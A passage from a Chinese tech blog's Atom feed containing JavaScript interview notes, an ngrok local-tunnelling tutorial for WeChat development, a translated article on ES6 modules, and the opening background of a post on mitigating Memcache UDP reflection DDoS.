&lt;li&gt;Number&lt;/li&gt;
&lt;li&gt;String&lt;/li&gt;
&lt;li&gt;Symbol (ECMAScript 6 新定义)&lt;/li&gt;
&lt;li&gt;Object&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中5种为基本类型: &lt;code&gt;string&lt;/code&gt;,&lt;code&gt;number&lt;/code&gt;,&lt;code&gt;boolean&lt;/code&gt;,&lt;code&gt;null&lt;/code&gt;,&lt;code&gt;undefined&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Object&lt;/code&gt; 为引用类型(范围挺大),也包括数组、函数,&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Symbol&lt;/code&gt;是原始数据类型 ，表示独一无二的值&lt;/p&gt;
&lt;h2 id=&quot;null和undefined的差异&quot;&gt;&lt;a href=&quot;#null和undefined的差异&quot; class=&quot;headerlink&quot; title=&quot;null和undefined的差异&quot;&gt;&lt;/a&gt;&lt;code&gt;null&lt;/code&gt;和&lt;code&gt;undefined&lt;/code&gt;的差异&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;相同点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在 if判断语句中,值都默认为 false&lt;br&gt;大体上两者都是代表无,具体看差异&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;不同点&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;null转为数字类型值为0,而undefined转为数字类型为 NaN(Not a Number)&lt;/li&gt;
&lt;li&gt;undefined是代表调用一个值而该值却没有赋值,这时候默认则为undefined&lt;/li&gt;
&lt;li&gt;null是一个很特殊的对象,最为常见的一个用法就是作为参数传入(说明该参数不是对象)&lt;/li&gt;
&lt;li&gt;设置为null的变量或者对象会被内存收集器回收&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;this对象的理解&quot;&gt;&lt;a href=&quot;#this对象的理解&quot; class=&quot;headerlink&quot; title=&quot;this对象的理解&quot;&gt;&lt;/a&gt;this对象的理解&lt;/h2&gt;&lt;p&gt;简言之: 谁调用指向谁, 运行时的上下文确定, 而非定义的时候就确定;&lt;/p&gt;
&lt;p&gt;强行绑定 this的话,可以用 call,apply,bind,箭头函数….来修改this的指向&lt;/p&gt;
&lt;h2 id=&quot;bind的-js简单模拟&quot;&gt;&lt;a href=&quot;#bind的-js简单模拟&quot; class=&quot;headerlink&quot; title=&quot;bind的 js简单模拟&quot;&gt;&lt;/a&gt;bind的 js简单模拟&lt;/h2&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;Function&lt;/span&gt;.prototype.emulateBind =  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;context&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; self = &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; self.apply(context);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="技术" scheme="https://www.love4026.org/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="前端" scheme="https://www.love4026.org/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="面试" scheme="https://www.love4026.org/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>使用ngrok搭建微信开发本地测试环境</title>
    <link href="https://www.love4026.org/316018/weixin-create-local-server-env/"/>
    <id>https://www.love4026.org/316018/weixin-create-local-server-env/</id>
    <published>2018-03-06T11:14:30.000Z</published>
    <updated>2019-02-07T14:01:38.535Z</updated>
    
    <content type="html"><![CDATA[<p>微信开发的时候，必须要输入URL而且必须是外网域名，导致本地没法调试，不过使用ngrok可以创建一个内网穿透的服务器，这样就可以使用本地的服务器调试了。</p><p><a href="https://ngrok.com/download" target="_blank" rel="noopener">ngrock下载地址</a></p><p>开启 ssh 端口</p><p><code>./ngrok tcp 22</code></p><p>这时在外网即可 ssh 访问本机：</p><p><code>ssh user@0.tcp.ngrok.io -p17840</code></p><p>开启 http(s) 服务：</p><p><code>./ngrok http 80</code></p><p>免费版并不能自定义域名，每次启动时的端口都会改变</p><p><a href="https://juejin.im/entry/58adb743b123db006730e691" target="_blank" rel="noopener">CentOS6 搭建自己的 ngrok 服务</a></p><p><a href="https://www.ngrok.cc/" target="_blank" rel="noopener">https://www.ngrok.cc/</a><br><a href="https://natapp.cn/" target="_blank" rel="noopener">https://natapp.cn/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;微信开发的时候，必须要输入URL而且必须是外网域名，导致本地没法调试，不过使用ngrok可以创建一个内网穿透的服务器，这样就可以使用本地的服务器调试了。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ngrok.com/download&quot; target=&quot;_blank&quot; 
      
    
    </summary>
    
      <category term="技术" scheme="https://www.love4026.org/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="ngrok" scheme="https://www.love4026.org/tags/ngrok/"/>
    
      <category term="微信" scheme="https://www.love4026.org/tags/%E5%BE%AE%E4%BF%A1/"/>
    
  </entry>
  
  <entry>
    <title>深入理解ES6的模块 -【翻译】</title>
    <link href="https://www.love4026.org/316016/es6-in-depth-modules/"/>
    <id>https://www.love4026.org/316016/es6-in-depth-modules/</id>
    <published>2018-03-06T05:37:57.000Z</published>
    <updated>2019-02-07T14:01:38.527Z</updated>
    
    <content type="html"><![CDATA[<p>回想2007年，那时候我刚加入Mozilla’s JavaScript团队，那时候的一个典型的JavaScript程序只需要一行代码，听起来像个笑话。</p><p>两年后，Google Maps发布。在这之前，JavaScript主要用来做表单的验证，你用来处理<code>&lt;input onchange=&gt;</code>这个程序当然只需要一行。</p><p>时过境迁，JavaScript项目已经发展到让人叹为观止，社区涌现了许多帮助开发的工具。但是最迫切需要的是一个模块系统，它能将你的工作分散到不同的文件与目录中，在需要的时候他们能彼此之间相互访问，并且可以有效的加载所有代码。所以JavaScript有模块系统这很正常，而且还有多个模块系统（CommonJS、AMD、CMD、UMD）。不仅如此，它还有几个包管理器（npm、bower），用来安装软件还能拷贝一些深度依赖。你可能认为ES6和它的新模块系统出现得有点晚。</p><p>那我们来看看ES6为现存的模块系统添加了什么，以及未来的标准和工具能否建立在这个系统上。首先，让我们看看ES6的模块是什么样子的。</p><h2 id="模块的基础知识"><a href="#模块的基础知识" class="headerlink" title="模块的基础知识"></a>模块的基础知识</h2><p>ES6模块是一个包含了JS代码的文件。没有所谓的<code>module</code>关键词，一个模块看起来和一个脚本文件没什么不一样，除了一下两个区别：</p><ul><li>ES6的模块自动开启严格模式，即使你没有写<code>&quot;use strict&quot;;</code>；</li><li>在模块中，你可以使用<code>import</code>和<code>exprot</code>。</li></ul><p>先来谈谈export。在默认情况下，模块中所有的声明都是私有的，如果你希望模块中的某些声明是公开的，并在其他模块中使用它们，你就必须导出它们。这里有一些实现方法，最简单的是添加<code>export</code>关键字</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kittydar.js - Find the locations of all the cats in an image.</span></span><br><span class="line"><span class="comment">// (Heather Arthur wrote this library for real)</span></span><br><span class="line"><span class="comment">// (but she didn't use modules, because it was 2013)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">detectCats</span>(<span class="params">canvas, options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> kittydar = <span class="keyword">new</span> Kittydar(options);</span><br><span class="line">  <span class="keyword">return</span> kittydar.detectCats(canvas);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Kittydar</span> </span>&#123;</span><br><span class="line">  ... several methods doing image processing ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This helper function isn't exported.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resizeCanvas</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>你可以<code>export</code>任何的顶级变量：<code>function</code>、<code>class</code>、<code>var</code>、<code>let</code>、<code>const</code>。</p><p>你如果要写一个模块知道这么多就够了！你不必再把所有的东西放到一个立即执行函数或者回调函数里面，只需要在你需要的地方进行声明。由于这个代码是一个模块，而不是一个脚本，所有的声明的作用域都只属于这个模块，而不是所有脚本和模块都能全局访问的。你只要把模块中的声明导出成一组公共模块的API就足够了。</p><p>除了导出，模块里的代码和其他普通代码没有什么区别。它可以访问全局变量，像<code>Object</code>和<code>Array</code>。如果你的模块在浏览器运行，还能够使用<code>document</code>和<code>XMLHttpRequest</code>。</p><p>在另一个文件中，我们可以导入并使用<code>detectCats()</code>函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// demo.js - Kittydar demo program</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123;detectCats&#125; <span class="keyword">from</span> <span class="string">"kittydar.js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> canvas = <span class="built_in">document</span>.getElementById(<span class="string">"catpix"</span>);</span><br><span class="line">    <span class="keyword">var</span> cats = detectCats(canvas);</span><br><span class="line">    drawRectangles(canvas, cats);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要从一个模块导入多个变量，你可以这样写：</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;detectCats, Kittydar&#125; <span class="keyword">from</span> <span class="string">"kittydar.js"</span>;</span><br></pre></td></tr></table></figure><p>当你运行一个包含<code>import</code>声明的模块，会先导入要导入的模块并加载，然后根据深度优先的原则遍历依赖图谱来执行对应模块，并跳过已经执行的模块，来避免循环。</p><p>这就是模块基础知识，这真的很简单。;-)</p><h2 id="导出列表"><a href="#导出列表" class="headerlink" title="导出列表"></a>导出列表</h2><p>你可以把你要导出的功能名写在一个列表里，然后用大括号括起来，这样就不用在每个要导出的功能前面加上export标记。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123;detectCats, Kittydar&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no `export` keyword required here</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">detectCats</span>(<span class="params">canvas, options</span>) </span>&#123; ... &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kittydar</span> </span>&#123; ... &#125;</span><br></pre></td></tr></table></figure><p>导出列表并不需要写在文件的第一行，它可以出现在模块文件的顶级作用域的任何位置。你可以有多个导出列表，或者将导出列表与导出声明混合使用，只要不重复导出同一个变量名就行。</p><h2 id="重命名导出和导入"><a href="#重命名导出和导入" class="headerlink" title="重命名导出和导入"></a>重命名导出和导入</h2><p>有时，导入的变量名碰巧与你需要使用的一些变量名冲突了，ES6允许你重命名导入的变量。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// suburbia.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Both these modules export something named `flip`.</span></span><br><span class="line"><span class="comment">// To import them both, we must rename at least one.</span></span><br><span class="line"><span class="keyword">import</span> &#123;flip <span class="keyword">as</span> flipOmelet&#125; <span class="keyword">from</span> <span class="string">"eggs.js"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;flip <span class="keyword">as</span> flipHouse&#125; <span class="keyword">from</span> <span class="string">"real-estate.js"</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>同样，你在导出变量的时候也可以重命名它们。这在你想使用不同名字导出相同功能的时候十分方便。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// unlicensed_nuclear_accelerator.js - media streaming without drm</span></span><br><span class="line"><span class="comment">// (not a real library, but maybe it should be)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">v1</span>(<span class="params"></span>) </span>&#123; ... &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">v2</span>(<span class="params"></span>) </span>&#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">  v1 <span class="keyword">as</span> streamV1,</span><br><span class="line">  v2 <span class="keyword">as</span> streamV2,</span><br><span class="line">  v2 <span class="keyword">as</span> streamLatestVersion</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="默认的导出"><a href="#默认的导出" class="headerlink" title="默认的导出"></a>默认的导出</h2><p>新的标准在设计上是兼容已经存在的CommonJS和AMD模块的。如果你有一个Node项目，并且你已经执行了<code>npm install lodash</code>。你使用ES6代码能够单独引入Lodash中的函数：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;each, map&#125; <span class="keyword">from</span> <span class="string">"lodash"</span>;</span><br><span class="line"></span><br><span class="line">each([<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>], <span class="function"><span class="params">x</span> =&gt;</span> <span class="built_in">console</span>.log(x));</span><br></pre></td></tr></table></figure><p>如果你已经习惯使用<code>_.each</code>而不是<code>each</code>，你依然想像以前一样使用它。或者， 你想把_当成一个函数来使用，因为这才是Lodash。</p><p>这种情况下，你只要稍微改变下你的写法：不使用花括号来导入模块。</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> _ <span class="keyword">from</span> <span class="string">"lodash"</span>;</span><br></pre></td></tr></table></figure><p>这个写法等同于<code>import {default as _} from &quot;lodash&quot;;</code>。所有的CommonJS 和AMD模块在ES6中都能被当作<code>default</code>导出，这个导出和你在CommonJS中使用<code>require()</code>导出得到东西一样，即<code>exports</code>对象。</p><p>ES6模块在设计上可以让你导出更多的东西，但对于现在的CommonJS模块，导出的default模块就是能导出的全部东西了。例如，在写这篇文章时，据我所知，著名的<a href="https://github.com/Marak/colors.js" target="_blank" rel="noopener">colors模块</a>没有特意去支持ES6语法，这是一个CommonJS模块组成的包，就像npm上的那些包一样，但是你可以直接引入到你的ES6代码中。</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> ES6 equivalent <span class="keyword">of</span> `<span class="javascript"><span class="keyword">var</span> colors = <span class="built_in">require</span>(<span class="string">"colors/safe"</span>);</span>`</span><br><span class="line"><span class="keyword">import</span> colors <span class="keyword">from</span> <span class="string">"colors/safe"</span>;</span><br></pre></td></tr></table></figure><p>如果你希望自己ES6模块也具有默认导出，这很简单。默认的导出方式并没有什么魔力；他就像其他导出一样，除了它的导出名为default。你可以使用我们之前提到的重命名语法：</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myObject = &#123;</span><br><span class="line">  field<span class="number">1</span>: <span class="keyword">value</span><span class="number">1</span>,</span><br><span class="line">  field<span class="number">2</span>: <span class="keyword">value</span><span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line">export &#123;myObject as <span class="keyword">default</span>&#125;;</span><br></pre></td></tr></table></figure><p>或者使用简写：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">export</span><span class="built_in"> default </span>&#123;</span><br><span class="line">  field1: value1,</span><br><span class="line">  field2: value2</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>export default</code>关键词后面可以跟任何值：一个函数、一个类、一个对象，所有能被命名的变量。</p><h2 id="模块对象"><a href="#模块对象" class="headerlink" title="模块对象"></a>模块对象</h2><p>不好意思，这篇文章有点长。JavaScript并不孤独：因为一些原因，所有的语言中都有模块系统，并且倾向于设计大量杂乱而又无聊的小特性。幸运的是我们只剩下一个话题，噢，不对，是两个。</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> cows <span class="keyword">from</span> <span class="string">"cows"</span>;</span><br></pre></td></tr></table></figure><p>当你使用<code>import *</code>的时候，被引入的是一个模块命名空间对象（module namespace object），它的属性是模块的输出。如果“cows”模块导出一个名为moo()的函数，那么在导入“cows”之后，你可以使用<code>cows.moo()</code>来进行调用。</p><h2 id="聚合模块"><a href="#聚合模块" class="headerlink" title="聚合模块"></a>聚合模块</h2><p>有时候一个包的主模块只不过是导入包其他所有的模块，并用统一的方式导出。为了简化这种代码，有一种将导入导出全部合一的简写：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> world-foods.js - good stuff <span class="keyword">from</span> all over</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> <span class="keyword">import</span> <span class="string">"sri-lanka"</span> <span class="keyword">and</span> re-<span class="keyword">export</span> some <span class="keyword">of</span> its exports</span><br><span class="line"><span class="keyword">export</span> &#123;Tea, Cinnamon&#125; <span class="keyword">from</span> <span class="string">"sri-lanka"</span>;</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> <span class="keyword">import</span> <span class="string">"equatorial-guinea"</span> <span class="keyword">and</span> re-<span class="keyword">export</span> some <span class="keyword">of</span> its exports</span><br><span class="line"><span class="keyword">export</span> &#123;Coffee, Cocoa&#125; <span class="keyword">from</span> <span class="string">"equatorial-guinea"</span>;</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> <span class="keyword">import</span> <span class="string">"singapore"</span> <span class="keyword">and</span> <span class="keyword">export</span> ALL <span class="keyword">of</span> its exports</span><br><span class="line"><span class="keyword">export</span> * <span class="keyword">from</span> <span class="string">"singapore"</span>;</span><br></pre></td></tr></table></figure><p>这种<code>export-from</code>表达式类似于<code>import-from</code>后面跟了一个export。这和真正的导入有一些区别，它不会在当前作用域中绑定将要导出的变量。如果你打算在<code>world-foods.js</code>中使用<code>Tea</code>来编写一些代码，请不要使用这种简写，你会发现Tea为定义。</p><p>如果“singapore”导出的命名与其他导出发生了冲突，那就会出现错误，所以请谨慎使用。</p><p>呼，我们已经把语法介绍完了！下面来谈谈一些有趣的事情。</p><h2 id="import到底做了什么？"><a href="#import到底做了什么？" class="headerlink" title="import到底做了什么？"></a><code>import</code>到底做了什么？</h2><p>不管你信不信，它什么都没做。</p><p>噢，你看起来没那么好骗。那么你会相信标准几乎没有说import到底该怎么做吗？这是件好事吗？（作者貌似很爱开玩笑。）</p><p>ES6将模块的加载细节<a href="http://www.ecma-international.org/ecma-262/6.0/index.html#sec-hostresolveimportedmodule" target="_blank" rel="noopener">完全交给了实现</a>，其余的模块执行部分却<a href="http://www.ecma-international.org/ecma-262/6.0/index.html#sec-toplevelmoduleevaluationjob" target="_blank" rel="noopener">规定得非常详细</a>。</p><p>简单来说，当你告诉JS引擎运行一个模块的时候，它的行为可以归纳为以下四部：</p><ol><li>解析：读取模块的源代码，并检查语法错误。</li><li>加载：加载所有的导入模块（递归进行），这是还未标准化的部分。</li><li>链接：对于每个新加载的模块，在实现上都会创建一个作用域，并把模块中声明的所有变量都绑定在这个作用域上，包括从其他模块导入的变量。如果你想试试<code>import {cake} from &quot;paleo&quot;</code>，但是“paleo”模块没真正导出名为cake的变量，你会得到一个错误。这很糟糕，因为你离运行js并品尝蛋糕只有一步之遥。</li><li>运行时间：最后，开始执行加载进来的新的模块中的代码。这时，整个import过程已经完成了，所以前面说代码执行到import这一行声明时，什么都没有发生。</li></ol><p>看到没？我说了什么都不会发生，在编程语言这件事上，我从来都不说慌。</p><p>现在我们可以开始介绍这个系统中有趣的部分了。这有一个非常炫酷的技巧。由于系统没有指定如何加载的这方面的细节，并且你可以通过查看源代码中导入的声明，提前计算出所有的依赖项，所以ES6的实现可以通过预处理器完成所有的工作，然后把所有的模块打包到一个文件中，最后通过网络进行请求一次即可。像webpack这样的工具就是这么做的。</p><p>这是一个优雅的解决方案，因为通过网络加载所有的脚本文件很耗时，假如你请求一个资源后，发现里面有import声明，然后你又得请求更多资源。一个加载器需要非常多的网络请求来回传输。通过webpack，你不仅能在今天就使用ES6的模块话，你还能获得很多好处，并且不需要担心会造成运行时的性能下降。</p><p>原本是有计划制定一个ES6中模块加载的详细规范的，并且已经初步成型。它没有成为标准的原因之一是不知道如何与打包这一特性进行整合。我希望模块化的加载会更加标准化，也希望打包工具会越来越好。</p><h2 id="静态-VS-动态，或者说：规则如何打破规则"><a href="#静态-VS-动态，或者说：规则如何打破规则" class="headerlink" title="静态 VS 动态，或者说：规则如何打破规则"></a>静态 VS 动态，或者说：规则如何打破规则</h2><p>作为一个动态编译语言，令人惊奇的是JavaScript拥有一个静态的模块系统。</p><ul><li>所有的<code>import</code>和<code>export</code>只能写在顶级作用域中。你不能在条件判断语句和函数作用域内使用import。</li><li>所有导出的变量名必须是显式的，你不能通过遍历一个数组，动态生成一组导出名进行导出。</li><li>模块对象都是被冻结的，不能通过polyfill为它添加新的特性。</li><li>在所有模块运行之前， 其依赖的模块都必须经过加载、解析、链接的过程，目前没有import懒加载相关的语法。（现在import()方法已经在提案中了）</li><li>对于import的错误，无法进行recovery。一个应用可能依赖许多的模块，一旦有一个模块加载失败，这个应用都不会运行。你不能在<code>try/catch</code>中使用<code>import</code>。正是因为es6的模块表现得如此静态，webpack才能在编译的时候检测出代码中的错误。</li><li>你没法为一个模块在加载所有依赖项之前添加钩子，这意味着一个模块没有办法控制其依赖项的加载方式。</li></ul><p>如果你的需求是静态的，ES6的模块系统还是相当不错的。但是你有时候你还是向进行一些hack，对吧？</p><p>这就是为什么你使用的模块加载系统会提供一些系统层次的API来配合ES6的静态的<code>import/export</code>语法。例如，webpack有一个API能进行代码的分割，按照你的需求对一些模块进行懒加载。这个API能够打破之前列出的规矩。</p><p>ES6的模块语法非常静态，这很好-在使用一些编译工具时我们都能尝到一些甜头。静态语法的设计可以让它与动态加载器丰富的API进行工作。</p><h2 id="我什么时候才能使用ES6模块？"><a href="#我什么时候才能使用ES6模块？" class="headerlink" title="我什么时候才能使用ES6模块？"></a>我什么时候才能使用ES6模块？</h2><p>如果你今天就想使用，你需要一个预编译器，如 <a href="https://github.com/google/traceur-compiler#what-is-traceur" target="_blank" rel="noopener">Traceur</a> 和 <a href="http://babeljs.io/" target="_blank" rel="noopener">Babel</a> 。这个系列之前也有相关文章，<a href="https://hacks.mozilla.org/2015/06/es6-in-depth-babel-and-broccoli/" target="_blank" rel="noopener">Gastón I. Silva：如何使用 Babel 和 Broccoli</a> 编译 ES6 代码为 web 可用。Gastón也将案例<a href="https://github.com/givanse/broccoli-babel-examples/tree/master/es6-modules" target="_blank" rel="noopener">放在了 GitHub 上</a>。另外<a href="http://2ality.com/2015/04/webpack-es6.html" target="_blank" rel="noopener">这篇文章</a>也介绍了如何使用 Babel 和 webpack。</p><p>ES6 模块系统由 Dave Herman 和 Sam Tobin-Hochstadt进行设计，他们不顾多人（包括我）的反对，多年来始终坚持模块系统是静态的。JonCoppeard正在Firefox上实现ES6的模块化功能。JavaScript Loader的相关标准的工作也正在进行中，预计在HTML中将会被添加类似<code>&lt;script type=module&gt;</code> 这样的东西。</p><p>这便是 ES6 了。</p><p>这太有趣了，我不希望现在就结束。也许我们还能再说一会。我们还能够讨论一些关于ES6规范中零零碎碎的东西，但这些又不足够写成文章。也行会有一些关于ES6未来特性的一些东西，尽请期待下周的<code>ES6 In Depth</code></p><p>原文链接：<a href="https://hacks.mozilla.org/2015/08/es6-in-depth-modules/" target="_blank" rel="noopener">ES6 In Depth: Modules</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;回想2007年，那时候我刚加入Mozilla’s JavaScript团队，那时候的一个典型的JavaScript程序只需要一行代码，听起来像个笑话。&lt;/p&gt;
&lt;p&gt;两年后，Google Maps发布。在这之前，JavaScript主要用来做表单的验证，你用来处理&lt;code
      
    
    </summary>
    
      <category term="技术" scheme="https://www.love4026.org/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="javascript" scheme="https://www.love4026.org/tags/javascript/"/>
    
      <category term="es6" scheme="https://www.love4026.org/tags/es6/"/>
    
  </entry>
  
  <entry>
    <title>LNMP修复Memcache UDP反射放大攻击</title>
    <link href="https://www.love4026.org/316014/lnmp-fix-memcache-udp-reflection-ddos/"/>
    <id>https://www.love4026.org/316014/lnmp-fix-memcache-udp-reflection-ddos/</id>
    <published>2018-03-06T05:13:34.000Z</published>
    <updated>2019-02-07T14:01:38.531Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于Memcached系统"><a href="#关于Memcached系统" class="headerlink" title="关于Memcached系统"></a>关于Memcached系统</h2><p>Memcached是一个自由开源的，高性能，分布式内存对象缓存系统。Memcached是以LiveJournal旗下Danga Interactive公司的Brad Fitzpatric为首开发的一款软件。现在已成为mixi、hatena、Facebook、Vox、LiveJournal等众多服务中提高Web应用扩展性的重要因素。Memcached是一种基于内存的key-value存储，用来存储小块的任意数据（字符串、对象）。这些数据可以是数据库调用、API调用或者是页面渲染的结果。Memcached简洁而强大。它的简洁设计便于快速开发，减轻开发难度，解决了大数据量缓存的很多问题。它的API兼容大部分流行的开发语言。本质上，它是一个简洁的key-value存储系统。一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。</p><h2 id="关于分布式DDoS原理"><a href="#关于分布式DDoS原理" class="headerlink" title="关于分布式DDoS原理"></a>关于分布式DDoS原理</h2><p>分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。</p><h2 